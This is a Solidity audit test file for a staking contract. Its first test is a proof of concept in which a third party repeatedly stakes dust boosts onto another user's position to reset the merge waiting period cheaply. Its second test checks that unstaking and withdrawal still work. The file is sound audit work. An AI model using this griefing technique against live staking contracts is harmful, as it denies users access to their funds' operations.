// SPDX-License-Identifier: MIT
pragma solidity =0.8.37;

import {StakeProtocolFeeTest} from "../StakeProtocolFee.t.sol";
import {IStakeErrors} from "../../src/interfaces/IStake.sol";

contract StakeAudit20261117 is StakeProtocolFeeTest {
    function testAudit_ThirdPartyDustBoostRepeatedlyDelaysMatureMerge() public {
        _deploy(false, 100_000e18);
        vm.prank(alice);
        stake.stakeLiquidity(address(child), 1000e18, 1000e18, 100, aliceId, type(uint256).max);
        phase.setPhase(102);

        uint256 checkpoint = vm.snapshotState();
        vm.prank(alice);
        stake.mergeStake(address(child), aliceId, bobId);
        (uint256 emptySource,,,,,,) = stake.memberStake(address(child), aliceId);
        assertEq(emptySource, 0, "control: the mature source can merge");
        assertTrue(vm.revertToState(checkpoint));

        uint256 attackerCost;
        for (uint256 i; i < 4; ++i) {
            uint256 round = 102 + i * 101;
            phase.setPhase(round);
            uint256 dust = uint256(1) << i;
            uint256 oldBoost = stake.validBoostShares(address(child), round, aliceId);
            assertGt(dust, oldBoost, "the dust receipt satisfies the reset predicate");
            assertEq(memberNFT.ownerOf(aliceId), alice, "attacker does not own the victim's NFT");
            vm.prank(bob);
            stake.stakeBoost(address(child), dust, 100, aliceId, type(uint256).max);
            attackerCost += dust;
            assertEq(stake.lastMajorStakeRound(address(child), aliceId), round);

            vm.expectRevert(abi.encodeWithSelector(
                IStakeErrors.MergeWaitingPeriodNotElapsed.selector, round, round + 100
            ));
            vm.prank(alice);
            stake.mergeStake(address(child), aliceId, bobId);
        }
        assertEq(attackerCost, 15, "four denials cost fifteen raw token units");
        phase.setPhase(506);
        vm.prank(alice);
        stake.mergeStake(address(child), aliceId, bobId);
        (uint256 sourceShares,,,,,,) = stake.memberStake(address(child), aliceId);
        assertEq(sourceShares, 0, "the merge succeeds after the attacker stops");
    }

    function testAudit_DustMergeGriefDoesNotPreventNormalUnlockAndWithdraw() public {
        _deploy(false, 100_000e18);
        _stake(alice, aliceId, 1000e18, 1000e18);
        phase.setPhase(3);
        vm.prank(bob);
        stake.stakeBoost(address(child), 1, 1, aliceId, type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(
            IStakeErrors.MergeWaitingPeriodNotElapsed.selector, uint256(3), uint256(4)
        ));
        vm.prank(alice);
        stake.mergeStake(address(child), aliceId, bobId);

        vm.prank(alice);
        stake.unstake(address(child), aliceId);
        vm.expectRevert(abi.encodeWithSelector(
            IStakeErrors.UnstakeAlreadyRequested.selector, address(child), aliceId
        ));
        vm.prank(bob);
        stake.stakeBoost(address(child), 2, 1, aliceId, type(uint256).max);
        phase.setPhase(5);
        uint256 tokenBefore = child.balanceOf(alice);
        uint256 parentBefore = parent.balanceOf(alice);
        vm.prank(alice);
        stake.withdraw(address(child), aliceId, type(uint256).max);
        assertEq(child.balanceOf(alice) - tokenBefore, 1000e18 + 1);
        assertEq(parent.balanceOf(alice) - parentBefore, 1000e18);
        (uint256 remainingShares, uint256 remainingBoost,,,,,) = stake.memberStake(address(child), aliceId);
        assertEq(remainingShares, 0);
        assertEq(remainingBoost, 0);
    }
}
